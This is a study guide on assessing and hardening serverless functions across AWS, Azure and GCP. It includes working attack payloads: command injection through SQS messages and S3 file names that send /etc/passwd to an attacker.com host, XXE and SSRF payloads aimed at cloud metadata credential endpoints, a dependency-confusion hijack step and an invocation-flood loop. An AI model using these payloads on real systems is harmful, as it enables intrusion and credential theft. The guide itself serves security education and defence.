# Serverless Security Guide

## Learning Objectives

Master the security assessment of serverless architectures across AWS Lambda, Azure Functions, and GCP Cloud Functions. Understand event-driven attack vectors, permission chains, and defense strategies unique to serverless environments.

---

## 1. AWS Lambda Security

### 1.1 Function Permission Assessment

Lambda functions execute under IAM roles. Overprivileged roles grant lateral movement capabilities.

```bash
# List all Lambda functions and their execution roles
aws lambda list-functions --output json | jq '.Functions[] | {name: .FunctionName, role: .Role, runtime: .Runtime, timeout: .Timeout, memory: .MemorySize}'

# Get the execution role's attached policies for a function
aws lambda get-function --function-name <function-name> --output json | jq '.Configuration.Role'

# After extracting the role ARN, enumerate its permissions
ROLE_ARN=$(aws lambda get-function --function-name <function-name> --output json | jq -r '.Configuration.Role')
ROLE_NAME=$(echo "$ROLE_ARN" | cut -d'/' -f2)
aws iam list-attached-role-policies --role-name "$ROLE_NAME"
aws iam list-role-policies --role-name "$ROLE_NAME"

# Check for wildcard permissions in inline policies
aws iam list-role-policies --role-name "$ROLE_NAME" --output json | jq -r '.PolicyNames[]' | while read policy; do
  echo "=== $policy ==="
  aws iam get-role-policy --role-name "$ROLE_NAME" --policy-name "$policy" --output json | jq '.PolicyDocument.Statement[] | select(.Resource == "*" or .Action == "*" or (.Action | type == "array" and contains(["*"])))'
done

# Find functions with admin-level roles
for fn in $(aws lambda list-functions --output json | jq -r '.Functions[].FunctionName'); do
  ROLE=$(aws lambda get-function --function-name "$fn" --output json | jq -r '.Configuration.Role' | cut -d'/' -f2)
  POLICIES=$(aws iam list-attached-role-policies --role-name "$ROLE" --output json | jq -r '.AttachedPolicies[].PolicyName')
  if echo "$POLICIES" | grep -qi "admin"; then
    echo "[!] $fn has admin role: $ROLE"
  fi
done
```

### 1.2 Event Source Injection

Lambda functions are triggered by events. Malicious data in event sources can exploit function logic.

**SQS Event Injection**:
```bash
# Send a malicious message to SQS queue that triggers Lambda
aws sqs send-message --queue-url <queue-url> --message-body '{"command": "$(curl http://attacker.com/exfil?data=$(cat /etc/passwd))", "action": "process"}'

# Test for command injection in SQS message processing
aws sqs send-message --queue-url <queue-url> --message-body '`id`'
aws sqs send-message --queue-url <queue-url> --message-body '$(whoami)'
aws sqs send-message --queue-url <queue-url> --message-body '; cat /etc/passwd'
```

**S3 Event Injection**:
```bash
# Upload a file with malicious name that triggers Lambda
# Lambda may parse filename unsafely
echo "test" > '/tmp/normal.txt; curl http://attacker.com/exfil'
aws s3 cp '/tmp/normal.txt; curl http://attacker.com/exfil' s3://<bucket>/

# Upload file with path traversal in key
echo "test" > /tmp/test.txt
aws s3 cp /tmp/test.txt "s3://<bucket>/../../../etc/passwd"

# Test for XML external entity injection if Lambda parses XML
aws s3 cp /tmp/malicious.xml s3://<bucket>/input.xml
# Where malicious.xml contains:
# <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><data>&xxe;</data>
```

**API Gateway Trigger Injection**:
```bash
# Test Lambda behind API Gateway for injection
curl -X POST "https://<api-id>.execute-api.<region>.amazonaws.com/prod/<resource>" \
  -H "Content-Type: application/json" \
  -d '{"input": "\"; curl http://169.254.169.254/latest/meta-data/iam/security-credentials/; echo \""}'

# Test path traversal through API Gateway
curl "https://<api-id>.execute-api.<region>.amazonaws.com/prod/../../../admin"
curl "https://<api-id>.execute-api.<region>.amazonaws.com/prod/%2e%2e/%2e%2e/admin"
```

### 1.3 Environment Variable Exposure

```bash
# List environment variables for all Lambda functions
aws lambda list-functions --output json | jq '.Functions[] | {name: .FunctionName, envVars: .Environment.Variables}'

# Look for sensitive variable names
aws lambda list-functions --output json | jq '.Functions[] | select(.Environment.Variables != null) | {name: .FunctionName, vars: [.Environment.Variables | keys[] | select(test("password|secret|token|key|credential|api_key"; "i"))]}'

# Check for database connection strings
aws lambda list-functions --output json | jq '.Functions[] | select(.Environment.Variables != null) | select(.Environment.Variables | tostring | test("mysql|postgres|mongodb|redis"; "i")) | .FunctionName'

# From inside a Lambda function (if RCE achieved), access all env vars
# In Lambda runtime:
# process.env (Node.js)
# os.environ (Python)
# Environment.GetEnvironmentVariables() (C#)
```

### 1.4 Lambda Layer Security

```bash
# List layers used by each function
aws lambda list-functions --output json | jq '.Functions[] | {name: .FunctionName, layers: [.Layers[].Arn]}'

# Get layer details
aws lambda get-layer-version --layer-name <layer-name> --version-number <version>

# Download and inspect a layer
aws lambda get-layer-version --layer-name <layer-name> --version-number <version> --output json | jq -r '.Content.Location' | xargs curl -o layer.zip
unzip layer.zip -d layer-inspect
# Check for backdoors, hardcoded credentials, or malicious code
find layer-inspect -name "*.py" -o -name "*.js" | xargs grep -l "eval\|exec\|subprocess\|child_process\|http\.request\|urllib"
```

### 1.5 Cold Start Information Leakage

Cold starts may leak information from previous invocations if the runtime reuses process state:

- **Global variables** persist across warm invocations
- **/tmp directory** persists across invocations (same execution environment)
- **Environment variables** from previous layers may be accessible

```bash
# Check Lambda function configuration for /tmp usage
aws lambda list-functions --output json | jq '.Functions[] | {name: .FunctionName, runtime: .Runtime, timeout: .Timeout}'

# If function code can be downloaded
aws lambda get-function --function-name <function-name> --output json | jq -r '.Code.Location' | xargs curl -o function.zip
unzip function.zip -d function-inspect

# Look for global state leakage patterns
# In Python functions:
grep -rn "global " function-inspect/
grep -rn "/tmp/" function-inspect/

# In Node.js functions:
grep -rn "fs.writeFileSync.*\/tmp" function-inspect/
grep -rn "require.*cache" function-inspect/
```

### 1.6 Invocation Type Abuse

```bash
# Check invocation types configured for function
aws lambda get-function --function-name <function-name> --output json | jq '.Configuration'

# Invoke function synchronously (may cause DoS if expensive operation)
aws lambda invoke --function-name <function-name> --invocation-type RequestResponse --cli-binary-format raw-in-base64-out --payload '{"action":"expensive_computation"}' response.json

# Invoke function asynchronously (may flood DLQ)
for i in $(seq 1 100); do
  aws lambda invoke --function-name <function-name> --invocation-type Event --payload '{"action":"trigger"}' /dev/null &
done

# Check for recursion (function triggers itself)
aws lambda get-policy --function-name <function-name> --output json | jq '.Policy.Statement[] | select(.Condition != null)'
```

---

## 2. Azure Functions Security

### 2.1 Function Key Management

```bash
# List function apps
az functionapp list --output table

# Get function keys (requires admin access)
az functionapp keys list --resource-group <rg> --name <function-app>
az functionapp function keys list --resource-group <rg> --name <function-app> --function-name <function>

# Check for exposed function keys in source control
# Search for host keys in repositories:
# Patterns: "x-functions-key", "code=", "host_key"

# Test function with and without authentication
curl "https://<function-app>.azurewebsites.net/api/<function>"
curl "https://<function-app>.azurewebsites.net/api/<function>?code=<function-key>"
curl -H "x-functions-key: <host-key>" "https://<function-app>.azurewebsites.net/api/<function>"

# Check authorization level (anonymous vs function vs admin)
az functionapp show --resource-group <rg> --name <function-app> --output json | jq '.'
```

### 2.2 Managed Identity Abuse

```bash
# Check managed identity configuration
az functionapp identity show --resource-group <rg> --name <function-app>

# List role assignments for the managed identity
PRINCIPAL_ID=$(az functionapp identity show --resource-group <rg> --name <function-app> --output json | jq -r '.principalId')
az role assignment list --assignee "$PRINCIPAL_ID" --output table

# Check for overly broad role assignments
az role assignment list --assignee "$PRINCIPAL_ID" --output json | jq '.[] | select(.roleDefinitionName | test("Owner|Contributor|User Access Administrator"))'

# If system-assigned identity, check what it can access
# From inside the function, use IMDS:
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### 2.3 App Service Plan Vulnerabilities

```bash
# Check function app hosting plan
az functionapp show --resource-group <rg> --name <function-app> --output json | jq '.kind'
az functionapp plan list --output table

# Check for consumption vs dedicated plan
# Dedicated plans share resources between functions
az functionapp plan show --resource-group <rg> --name <plan> --output json | jq '{sku: .sku, workerCount: .numberOfWorkers, maxBurst: .maximumElasticWorkerCount}'

# Check VNet integration
az functionapp vnet-integration list --resource-group <rg> --name <function-app>

# Check access restrictions
az functionapp config access-restriction show --resource-group <rg> --name <function-app>
```

### 2.4 Durable Functions Security Considerations

```bash
# Check for durable function storage in table storage
# Durable functions store state in Azure Storage
az storage table list --account-name <storage-account> --output table

# Check for sensitive data in orchestration history
az storage entity query --table-name <instance-table> --account-name <storage-account> --output json | jq '.items[] | {instanceId: .RowKey, status: .RuntimeStatus}'

# Test for orchestration injection
# If function accepts orchestration input without validation:
curl -X POST "https://<function-app>.azurewebsites.net/api/orchestrators/<function>" \
  -H "Content-Type: application/json" \
  -d '{"input": "malicious-payload"}'
```

---

## 3. GCP Cloud Functions Security

### 3.1 Service Account Over-Permission

```bash
# List all Cloud Functions
gcloud functions list --format="table(name,serviceAccount,trigger)"

# Get function details including service account
gcloud functions describe <function-name> --region=<region> --format=json | jq '{name: .name, serviceAccount: .serviceAccount, runtime: .runtime, entryPoint: .entryPoint}'

# Check service account roles
SA_EMAIL=$(gcloud functions describe <function-name> --region=<region> --format=json | jq -r '.serviceAccount')
gcloud projects get-iam-policy <project-id> --flatten="bindings[].members" --filter="bindings.members:${SA_EMAIL}" --format="table(bindings.role)"

# Check for owner/editor roles on service account
gcloud projects get-iam-policy <project-id> --flatten="bindings[].members" --filter="bindings.members:${SA_EMAIL}" --format=json | jq '.bindings[].role' | grep -E "roles/owner|roles/editor|roles/admin"
```

### 3.2 HTTP Trigger Authentication

```bash
# Check if function allows unauthenticated invocations
gcloud functions describe <function-name> --region=<region> --format=json | jq '.httpsTrigger'

# Check IAM policy on the function
gcloud functions get-iam-policy <function-name> --region=<region>

# Test unauthenticated access
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"

# Test with identity token
curl -H "Authorization: Bearer $(gcloud auth print-identity-token)" \
  "https://<region>-<project-id>.cloudfunctions.net/<function-name>"

# Find all functions allowing unauthenticated access
gcloud functions list --format="json" | jq '.[] | select(.httpsTrigger != null) | .name' | while read fn; do
  POLICY=$(gcloud functions get-iam-policy "$fn" --format=json 2>/dev/null)
  if echo "$POLICY" | jq -r '.bindings[].members[]' 2>/dev/null | grep -q "allUsers"; then
    echo "[!] Unauthenticated: $fn"
  fi
done
```

### 3.3 Cloud Run Security Comparison

```bash
# Cloud Run is the successor to Cloud Functions (2nd gen)
# List Cloud Run services
gcloud run services list --format="table(name,region,url)"

# Check Cloud Run IAM policy
gcloud run services get-iam-policy <service> --region=<region>

# Check for unauthenticated access
gcloud run services get-iam-policy <service> --region=<region> --format=json | jq '.bindings[] | select(.members[] | contains("allUsers")) | .role'

# Compare security features:
# Cloud Functions (1st gen): HTTP trigger, limited configuration
# Cloud Functions (2nd gen): Built on Cloud Run, more security controls
# Cloud Run: Full container support, VPC connector, Binary Authorization
```

---

## 4. Common Serverless Attack Patterns

### 4.1 Event Injection Across All Providers

Event injection exploits the trust boundary between event sources and function code:

| Provider | Event Source | Injection Vector |
|----------|-------------|-----------------|
| AWS | SQS | Malicious message body with command injection |
| AWS | S3 | Filename with special characters, malicious file content |
| AWS | API Gateway | HTTP request body, headers, path parameters |
| Azure | Service Bus | Message properties and body |
| Azure | Event Grid | Event data payload |
| GCP | Pub/Sub | Message data and attributes |
| GCP | Cloud Storage | Object metadata and content |

### 4.2 Dependency Confusion Attacks

Serverless functions often install dependencies at build time. Confusion attacks target the build pipeline:

```bash
# Check for private dependency usage in function code
# Download function source first
aws lambda get-function --function-name <function-name> --output json | jq -r '.Code.Location' | xargs curl -o function.zip
unzip function.zip -d function-src

# Look for private/internal package references
grep -rn "require\|import" function-src/ | grep -v "node_modules"
grep -rn "from " function-src/ | grep -v "__pycache__"

# For Python: check requirements.txt
cat function-src/requirements.txt 2>/dev/null

# For Node.js: check package.json dependencies
cat function-src/package.json 2>/dev/null | jq '.dependencies'

# Identify internal package names that could be confused
# Register a public package with the same name to hijack
```

### 4.3 SSRF Through Serverless Functions

```bash
# Test if function can reach cloud metadata services
# AWS IMDSv1
curl -X POST "https://<function-url>" -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# Azure IMDS
curl -X POST "https://<function-url>" -d '{"url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"}'

# GCP metadata
curl -X POST "https://<function-url>" -d '{"url": "http://metadata.google.internal/computeMetadata/v1/service-accounts/default/token"}'

# Internal service discovery through SSRF
curl -X POST "https://<function-url>" -d '{"url": "http://localhost:8080/admin"}'
curl -X POST "https://<function-url>" -d '{"url": "http://10.0.0.1:443/"}'
```

### 4.4 Data Exfiltration via Function Output

```bash
# Test for sensitive data in function responses
curl "https://<function-url>" -d '{"query": "users"}' | jq '.'

# Check if error messages leak internal details
curl "https://<function-url>" -d '{"invalid": "payload"}'
curl "https://<function-url>" -d '!{invalid json'
curl "https://<function-url>" -d '{"id": "999999999"}'

# Test for verbose logging that may be accessible
# AWS CloudWatch Logs
aws logs get-log-events --log-group-name "/aws/lambda/<function-name>" --log-stream-name <stream> --output json | jq '.events[].message'

# Azure Application Insights
az monitor app-insights query --app <app-id> --analytics-query "traces | where cloud_RoleName == '<function-app>' | project message, timestamp | order by timestamp desc | limit 50"
```

---

## 5. Defense and Hardening

### 5.1 Least Privilege Function Roles

```bash
# Generate a policy based on function's actual CloudTrail activity
# AWS Access Analyzer can generate least-privilege policies
aws accessanalyzer generate-policy --policy-store-id <store-id> \
  --analysis-id <analysis-id> \
  --cloud-trail-source '{"accountId": "<account-id>", "regions": ["us-east-1"]}'

# For Lambda, use AWS Compute Optimizer recommendations
aws lambda get-policy-recommendation --function-name <function-name>

# Example least-privilege Lambda role policy
cat <<'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::specific-bucket",
        "arn:aws:s3:::specific-bucket/*"
      ]
    },
    {
      "Effect": "Allow",
      "Action": [
        "logs:CreateLogGroup",
        "logs:CreateLogStream",
        "logs:PutLogEvents"
      ],
      "Resource": "arn:aws:logs:*:*:*"
    }
  ]
}
EOF
```

### 5.2 Function-Level Networking Restrictions

```bash
# AWS Lambda: Configure VPC access
aws lambda update-function-configuration --function-name <function-name> \
  --vpc-config SubnetIds=subnet-xxx,subnet-yyy,SecurityGroupIds=sg-zzz

# Restrict outbound traffic via security group (no 0.0.0.0/0 egress)
aws ec2 revoke-security-group-egress --group-id sg-zzz --protocol "-1" --port "-1" --cidr "0.0.0.0/0"
aws ec2 authorize-security-group-egress --group-id sg-zzz --protocol tcp --port 443 --cidr "10.0.0.0/8"

# Azure Functions: Configure access restrictions
az functionapp config access-restriction add \
  --resource-group <rg> --name <function-app> \
  --rule-name "deny-all" --action Deny --priority 100

# GCP Cloud Functions: Configure VPC connector
gcloud functions deploy <function-name> \
  --vpc-connector <connector-name> \
  --egress-settings private-ranges-only
```

### 5.3 Monitoring and Alerting for Serverless

```bash
# AWS: Create CloudWatch alarm for Lambda errors
aws cloudwatch put-metric-alarm \
  --alarm-name "lambda-errors-<function-name>" \
  --metric-name Errors \
  --namespace AWS/Lambda \
  --statistic Sum \
  --period 300 \
  --threshold 5 \
  --comparison-operator GreaterThanThreshold \
  --dimensions Name=FunctionName,Value=<function-name> \
  --evaluation-periods 1

# AWS: Monitor for credential exfiltration via GuardDuty
aws guardduty get-detector --detector-id <detector-id>

# Azure: Enable Application Insights for functions
az monitor app-insights component create \
  --app <function-app>-insights \
  --resource-group <rg> \
  --location <location>

# Set up alerts for anomalous function activity
az monitor metrics alert create \
  --name "function-errors" \
  --resource-group <rg> \
  --scopes <function-app-resource-id> \
  --condition "count HttpResultCode eq 500 greater 10" \
  --window-size 5m
```

### 5.4 Serverless-Specific WAF Rules

```bash
# AWS WAF for API Gateway + Lambda
aws wafv2 create-web-acl \
  --name "serverless-protection" \
  --scope REGIONAL \
  --default-action Allow={} \
  --rules '[{"Name":"rate-limit","Priority":1,"Statement":{"RateBasedStatement":{"Limit":100,"AggregateKeyType":"IP"}},"Action":{"Block":{}},"VisibilityConfig":{"SampledRequestsEnabled":true,"CloudWatchMetricsEnabled":true,"MetricName":"rate-limit"}}]'

# Azure WAF for Function Apps behind Application Gateway
az network application-gateway waf-policy create \
  --name serverless-waf \
  --resource-group <rg>

# Common serverless WAF rule recommendations:
# 1. Rate limiting per IP (prevent invocation abuse)
# 2. Block known injection patterns (SQL, NoSQL, command injection)
# 3. Block metadata service IP ranges (169.254.169.254, metadata.google.internal)
# 4. Request body size limits (prevent memory exhaustion)
# 5. Block outbound requests to known exfiltration endpoints
```

---

## Learning Checklist

### Theory Mastery
- [ ] Understand serverless execution model and shared responsibility
- [ ] Know event-driven attack vectors (event injection, SSRF)
- [ ] Understand IAM roles for serverless across all three providers
- [ ] Know cold start security implications
- [ ] Understand dependency confusion in serverless build pipelines

### Practical Skills
- [ ] Enumerate Lambda functions and assess execution role permissions
- [ ] Test event source injection across SQS, S3, and API Gateway
- [ ] Identify environment variable exposure in serverless functions
- [ ] Assess Azure Functions managed identity and key management
- [ ] Test GCP Cloud Functions for unauthenticated access

### Defense Capabilities
- [ ] Generate least-privilege policies for serverless roles
- [ ] Configure VPC restrictions for function networking
- [ ] Set up monitoring and alerting for serverless anomalies
- [ ] Implement serverless-specific WAF rules
- [ ] Secure the serverless build pipeline against supply chain attacks

---

**Document Version**: 1.0
**Created**: 2026-05-14
**Estimated Study Time**: 5-7 hours
**Prerequisites**: Cloud fundamentals (AWS/Azure/GCP), IAM knowledge, basic serverless concepts
